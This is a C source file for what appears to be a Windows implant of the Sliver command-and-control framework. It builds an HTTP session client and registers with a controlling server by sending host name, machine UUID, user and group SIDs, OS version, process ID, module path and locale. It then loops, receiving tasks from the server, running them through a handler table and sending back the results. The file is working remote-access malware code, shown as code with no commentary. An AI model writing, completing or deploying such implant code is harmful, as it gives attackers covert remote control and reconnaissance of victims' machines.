#include "pch.h"

PSLIVER_SESSION_CLIENT SessionInit
(
	_In_ PGLOBAL_CONFIG pGlobalConfig
)
{
	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
	UINT64 uReconnectDuration = 300;

	pSessionClient = ALLOC(sizeof(SLIVER_BEACON_CLIENT));
	memcpy(&pSessionClient->GlobalConfig, pGlobalConfig, sizeof(GLOBAL_CONFIG));
#ifdef __HTTP__
	pSessionClient->Init = (CLIENT_INIT)HttpInit;
	pSessionClient->Start = HttpStart;
	pSessionClient->Send = HttpSend;
	pSessionClient->Receive = HttpRecv;
	pSessionClient->Close = HttpClose;
	pSessionClient->Cleanup = HttpCleanup;
#else
#endif

CLEANUP:
	return pSessionClient;
}

VOID SessionMain
(
	_In_ PSLIVER_SESSION_CLIENT pSession
)
{
	PENVELOPE pEnvelope = NULL;
	PSLIVER_THREADPOOL pSliverPool = NULL;
	PTP_WORK pWork = NULL;
	PSESSION_WORK_WRAPPER pWrapper = NULL;
	DWORD dwNumberOfAttempts = 0;

	pSliverPool = InitializeSliverThreadPool();
	if (pSliverPool == NULL) {
		goto CLEANUP;
	}

	while (TRUE) {
		if (dwNumberOfAttempts >= pSession->GlobalConfig.dwMaxFailure) {
			break;
		}

		pEnvelope = pSession->Receive(&pSession->GlobalConfig, pSession->lpClient);
		if (pEnvelope == NULL) {
			dwNumberOfAttempts++;
			Sleep(pSession->GlobalConfig.dwPollInterval * 1000);
			continue;
		}

		PrintFormatW(L"Receive Envelope:\n");
		HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
		pWrapper = ALLOC(sizeof(SESSION_WORK_WRAPPER));
		pWrapper->pSession = pSession;
		pWrapper->pEnvelope = pEnvelope;
		pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)MainHandler, pWrapper, &pSliverPool->CallBackEnviron);
		if (pWork == NULL) {
			LOG_ERROR("CreateThreadpoolWork", GetLastError());
			goto CLEANUP;
		}

		TpPostWork(pWork);
		Sleep(pSession->GlobalConfig.dwPollInterval * 1000);
	}

CLEANUP:
	FreeSliverThreadPool(pSliverPool);

	return;
}

BOOL SesionRegister
(
	_In_ PSLIVER_SESSION_CLIENT pSession
)
{
	LPSTR lpUUID = NULL;
	LPSTR lpFullQualifiedName = NULL;
	LPSTR lpUserSid = NULL;
	LPSTR lpGroupSid = NULL;
	SYSTEM_INFO SystemInfo;
	RTL_OSVERSIONINFOW OsVersion;
	LPSTR lpVersion = NULL;
	LPSTR lpHostName = NULL;
	LPSTR lpArch = NULL;
	LPSTR lpModulePath = NULL;
	DWORD cbModulePath = MAX_PATH;
	DWORD dwReturnedLength = 0;
	DWORD dwLastError = 0;
	LPSTR lpLocaleName = NULL;
	WCHAR wszLocale[0x20];
	BOOL Result = FALSE;
	CHAR szOsName[] = "windows";

	PPBElement pFinalElement = NULL;
	PPBElement ElementList[17];
	ENVELOPE RegisterEnvelope;

	lpUUID = GetHostUUID();
	if (lpUUID == NULL) {
		goto CLEANUP;
	}

	lpUUID[lstrlenA(lpUUID) - 1] = '\0';
	lpFullQualifiedName = GetComputerUserName();
	if (lpFullQualifiedName == NULL) {
		goto CLEANUP;
	}

	lpUserSid = GetCurrentProcessUserSID();
	if (lpUserSid == NULL) {
		goto CLEANUP;
	}

	lpGroupSid = GetCurrentProcessGroupSID();
	if (lpGroupSid == NULL) {
		goto CLEANUP;
	}

	SecureZeroMemory(&OsVersion, sizeof(OsVersion));
	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
	if (!GetOsVersion(&OsVersion)) {
		LOG_ERROR("GetOsVersion", GetLastError());
		goto CLEANUP;
	}

	SecureZeroMemory(&SystemInfo, sizeof(SystemInfo));
	GetNativeSystemInfo(&SystemInfo);
	lpVersion = ALLOC(0x100);
	wsprintfA(lpVersion, "%d build %d", OsVersion.dwMajorVersion, OsVersion.dwBuildNumber);
	if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
		lstrcatA(lpVersion, " x86_64");
		lpArch = DuplicateStrA("amd64", 0);
	}
	else if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
		lstrcatA(lpVersion, " x86");
		lpArch = DuplicateStrA("386", 0);
	}
	else {
		lpArch = DuplicateStrA("(NULL)", 0);
	}

	lpHostName = GetHostName();
	lpModulePath = ALLOC(cbModulePath + 1);
	while (TRUE) {
		SecureZeroMemory(lpModulePath, cbModulePath + 1);
		dwReturnedLength = GetModuleFileNameA(NULL, lpModulePath, cbModulePath);
		dwLastError = GetLastError();
		if (dwLastError == ERROR_INSUFFICIENT_BUFFER) {
			cbModulePath *= 2;
			lpModulePath = REALLOC(lpModulePath, cbModulePath + 1);
		}

		break;
	}

	GetSystemDefaultLocaleName(wszLocale, _countof(wszLocale));
	lpLocaleName = ConvertWcharToChar(wszLocale);

	SecureZeroMemory(ElementList, sizeof(ElementList));
	ElementList[0] = CreateBytesElement(pSession->GlobalConfig.szSliverName, lstrlenA(pSession->GlobalConfig.szSliverName), 1);
	ElementList[1] = CreateBytesElement(lpHostName, lstrlenA(lpHostName), 2);
	ElementList[2] = CreateBytesElement(lpUUID + 1, lstrlenA(lpUUID + 1), 3);
	ElementList[3] = CreateBytesElement(lpFullQualifiedName, lstrlenA(lpFullQualifiedName), 4);
	ElementList[4] = CreateBytesElement(lpUserSid, lstrlenA(lpUserSid), 5);
	ElementList[5] = CreateBytesElement(lpGroupSid, lstrlenA(lpGroupSid), 6);
	ElementList[6] = CreateBytesElement(szOsName, lstrlenA(szOsName), 7);
	ElementList[7] = CreateBytesElement(lpArch, lstrlenA(lpArch), 8);
	ElementList[8] = CreateVarIntElement(GetCurrentProcessId(), 9);
	ElementList[9] = CreateBytesElement(lpModulePath, lstrlenA(lpModulePath), 10);
	ElementList[11] = CreateBytesElement(lpVersion, lstrlenA(lpVersion), 12);
	ElementList[12] = CreateVarIntElement(pSession->GlobalConfig.dwReconnectInterval, 13);
	ElementList[14] = CreateBytesElement(pSession->GlobalConfig.szConfigID, lstrlenA(pSession->GlobalConfig.szConfigID), 16);
	ElementList[15] = CreateVarIntElement(pSession->GlobalConfig.uPeerID, 17);
	ElementList[16] = CreateBytesElement(lpLocaleName, lstrlenA(lpLocaleName), 18);

	pFinalElement = CreateStructElement(ElementList, _countof(ElementList), 0);
	RegisterEnvelope.pData->pBuffer = pFinalElement->pMarshalledData;
	RegisterEnvelope.pData->cbBuffer = pFinalElement->cbMarshalledData;
	RegisterEnvelope.uType = MsgRegister;
	pFinalElement->pMarshalledData = NULL;
	Result = pSession->Send(&pSession->GlobalConfig, pSession->lpClient, &RegisterEnvelope);
CLEANUP:
	if (lpHostName != NULL) {
		FREE(lpHostName);
	}

	if (lpUUID != NULL) {
		FREE(lpUUID);
	}

	if (lpFullQualifiedName != NULL) {
		FREE(lpFullQualifiedName);
	}

	if (lpUserSid != NULL) {
		FREE(lpUserSid);
	}

	if (lpGroupSid != NULL) {
		FREE(lpGroupSid);
	}

	if (lpArch != NULL) {
		FREE(lpArch);
	}

	if (lpModulePath != NULL) {
		FREE(lpModulePath);
	}

	if (lpVersion != NULL) {
		FREE(lpVersion);
	}

	if (lpLocaleName != NULL) {
		FREE(lpLocaleName);
	}

	FreeElement(pFinalElement);
	return Result;
}

VOID SessionMainHandler
(
	_Inout_ PTP_CALLBACK_INSTANCE Instance,
	_Inout_opt_ PENVELOPE_WRAPPER pWrapper,
	_Inout_ PTP_WORK Work
)
{
	PENVELOPE pResp = NULL;
	PENVELOPE pEnvelope = NULL;
	LPSTR lpErrorDesc = NULL;
	SYSTEM_HANDLER* pSystemHandler = NULL;
	SYSTEM_HANDLER Handler = NULL;
	PSLIVER_SESSION_CLIENT pSession = NULL;

	//hException = AddVectoredExceptionHandler(1, ContinuableExceptionHanlder);
	pEnvelope = pWrapper->pEnvelope;
	pSession = pWrapper->pSession;
	pSystemHandler = GetSystemHandler();
	Handler = pSystemHandler[pEnvelope->uType];
	if (Handler != NULL) {
		pResp = Handler(pEnvelope);
	}

	if (pResp == NULL) {
		//lpErrorDesc = TlsGetValue(dwTlsIdx);
		pResp = CreateErrorRespEnvelope("Failed to execute task", pEnvelope->uID, 9);
	}

	pSession->Send(&pSession->GlobalConfig, pSession->lpClient , pResp);
CLEANUP:
	if (lpErrorDesc != NULL) {
		UnmapViewOfFile(lpErrorDesc);
	}

	if (pSystemHandler != NULL) {
		FREE(pSystemHandler);
	}

	//RemoveVectoredExceptionHandler(hException);
	FreeEnvelope(pResp);
	FreeEnvelope(pEnvelope);
	FREE(pWrapper);

	return;
}

VOID SessionMainLoop
(
	_In_ PSLIVER_SESSION_CLIENT pSession
)
{
	PENVELOPE pEnvelope = NULL;
	PSLIVER_THREADPOOL pSliverPool = NULL;
	PTP_WORK pWork = NULL;
	PENVELOPE_WRAPPER pWrapper = NULL;
	DWORD dwNumberOfAttempts = 0;

	pSliverPool = InitializeSliverThreadPool();
	if (pSliverPool == NULL) {
		goto CLEANUP;
	}

	while (TRUE) {
		if (dwNumberOfAttempts >= pSession->GlobalConfig.dwMaxFailure) {
			break;
		}

		pEnvelope = pSession->Receive(&pSession->GlobalConfig, pSession->lpClient);
		if (pEnvelope == NULL) {
			dwNumberOfAttempts++;
			Sleep(pSession->GlobalConfig.dwPollInterval * 1000);
			continue;
		}

		PrintFormatW(L"Receive Envelope:\n");
		HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
		pWrapper = ALLOC(sizeof(ENVELOPE_WRAPPER));
		pWrapper->pSession = pSession;
		pWrapper->pEnvelope = pEnvelope;
		pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)MainHandler, pWrapper, &pSliverPool->CallBackEnviron);
		if (pWork == NULL) {
			LOG_ERROR("CreateThreadpoolWork", GetLastError());
			goto CLEANUP;
		}

		TpPostWork(pWork);
		Sleep(pSession->GlobalConfig.dwPollInterval * 1000);
	}

CLEANUP:
	FreeSliverThreadPool(pSliverPool);

	return;
}